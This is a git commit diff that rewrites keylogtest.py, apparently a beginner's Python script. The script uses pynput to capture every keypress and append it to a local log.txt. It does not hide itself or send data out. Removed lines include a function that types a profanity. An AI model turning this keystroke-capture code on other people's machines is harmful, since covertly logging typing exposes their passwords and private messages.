693bf72f0bd2fdc18922e32f31da6f6bc1e84f0a
vgkrishnaaditya <149256923+vgkrishnaaditya@users.noreply.github.com>
2024-03-12 20:20:30 +0530

    Update keylogtest.py

--- keylogtest.py
+++ keylogtest.py
@@ -1,29 +1,32 @@
-from pynput.keyboard import Listener
-from pynput.keyboard import Controller
-from pynput.mouse import Listener
-from pynput.mouse import Controller
-"""
-fl=open("log.txt", 'a'); #saving instance of log.txt after opening, to fl
-fl.write("");
-fl.close(); 
+from pynput.keyboard import Listener as KeyListener
 
-"""
+class keylogtest:
 
-def cmouse():
-	mouse=Controller();
-	mouse.position=(10, 20) # Position is in px
-'''
-def lmouse(x, y):
-	print("Position="+format((x,y)));
-	
-def ckb():
-	kb=Controller();
-	kb.type("Fuck You"); 
-	'''
-'''def wtf(key):
-	ks=(str(key).replace("'"," "));
-	with open("log.txt", 'a') as fl:
-		fl.write(ks);
-		
-with Listener(on_press=wtf) as listen: #saving instance of Listener(...) as listen
-	listen.join(); '''
+    def __init__(self):
+        self.kl = KeyListener()
+    
+    def wtf(self, key):
+        lst = []
+        ks = str(key).replace("'","")
+        if(ks == 'Key.space'):
+            ks = ' ';
+        elif(ks == 'Key.backspace'):
+            ks = '-1';
+        elif(ks == 'Key.delete'):
+            ks = '-1';
+        elif(ks == 'Key.enter'):
+            ks = ' ';
+        elif(ks== 'Key.left'):
+        	ks='-1';
+        elif(ks=='Key.right'):
+        	ks='-1';
+        lst.append(ks)
+        with open("log.txt", 'a') as fl:
+            fl.write(ks)
+
+    def main(self):
+    	with KeyListener(on_press=self.wtf) as listen:
+    		listen.join();
+if(__name__=="__main__"):
+	obj = keylogtest()
+	obj.main()
